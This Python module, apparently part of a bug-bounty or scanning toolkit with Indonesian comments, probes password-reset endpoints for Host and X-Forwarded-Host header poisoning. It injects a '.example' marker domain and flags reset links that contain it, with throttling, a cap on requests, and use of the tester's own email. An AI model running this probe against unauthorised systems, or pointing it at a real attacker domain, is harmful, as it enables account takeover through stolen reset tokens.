"""host_header_poison — Host/Forwarded-Host injection pada flow password
reset (CWE-639/444, critical).

Teknik: POST reset dengan Host/X-Forwarded-Host milik "peneliti" (domain
marker .example — aman, bukan infra nyata). Bukti kuat: link reset yang
mengandung domain marker muncul di respons. Bukti medium: response berbeda
signifikan vs baseline (butuh konfirmasi lewat email milik sendiri —
cease-on-data). Tidak ada email orang lain yang disentuh.
"""

from __future__ import annotations

import re

from . import http_engine
from .base import Tool, ToolContext, ToolResult, redact
from ..findings import Finding

_MARKER = "cyphron-oob.example"
_LINK_RE = re.compile(r"https?://[^\s\"'<>]{8,180}")


class HostHeaderPoisonTool(Tool):
    name = "host_header_poison"
    description = ("Password-reset Host header poisoning: link reset dengan "
                   "domain marker di respons = critical; perubahan lain = "
                   "perlu konfirmasi email milik sendiri.")
    risk_tags = {"active"}
    source_skill = "bounty-high-02"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        url = str(args.get("url") or "")
        email_field = str(args.get("email_field") or "email")
        email = str(args.get("email") or "")
        if not url or not email:
            return ToolResult(tool=self.name, ok=False,
                              error="args.url + args.email (email sendiri) wajib")

        def post(extra: dict[str, str] | None):
            ctx.throttle()
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            if extra:
                headers.update(extra)
            st, _h, body, _ms = http_engine.http_get(
                url, timeout=ctx.timeout_s, method="POST",
                data=f"{email_field}={email}".encode(), headers=headers)
            ctx.world.request_count += 1
            return st, body

        b_st, b_body = post(None)
        shapes = [{"variant": "baseline", "status": b_st, "len": len(b_body)}]

        findings: list[Finding] = []
        evidence: list[dict] = []
        for hname, hval in (("Host", _MARKER),
                            ("X-Forwarded-Host", _MARKER)):
            if ctx.world.request_count >= ctx.max_requests:
                break
            st, body = post({hname: hval})
            links = [l for l in _LINK_RE.findall(body) if _MARKER in l]
            changed = body != b_body
            evidence.append({"header": hname, "status": st,
                             "poisoned_link_in_body": bool(links),
                             "changed": changed})
            shapes.append({"variant": f"poison-{hname}", "status": st,
                           "changed": changed})
            if links:
                findings.append(Finding(
                    tool=self.name,
                    title=f"Password reset poisoning via {hname}",
                    severity="critical", cwe="CWE-444",
                    description=(f"Flow password-reset menghasilkan link dengan "
                                 f"host {hval} saat {hname} di-inject — link "
                                 f"reset yang terkirim ke korban dapat dialihkan "
                                 f"ke domain penyerang (account takeover "
                                 f"melalui penuai token reset). cease-on-data: "
                                 f"marker .example tidak dioperasikan lebih jauh."),
                    recommendation=("Bangun URL reset dari config allowlist, "
                                    "bukan dari header Host; whitelist host di edge."),
                    file_path=None, line_start=None, line_end=None,
                    request=f"POST {url} ({hname}: {hval})",
                    response=f"link marker: {redact(links[0][:100])}",
                    confidence=0.9, source_skill=self.source_skill,
                    status="confirmed", evidence_kind="request-response",
                ))
                break  # cease-on-data
        else:
            # tidak ada link di body; catat kebutuhan konfirmasi email
            if any(e["changed"] for e in evidence):
                ctx.world.note("host_header_poison: respons berubah saat Host "
                               "di-inject — konfirmasi final lewat email "
                               "milik sendiri (periksa domain link reset)")
        return ToolResult(tool=self.name, ok=True, data={
            "url": url, "shapes": shapes, "evidence": evidence,
            "needs_email_confirmation": not findings and any(
                e["changed"] for e in evidence),
        }, findings=findings)
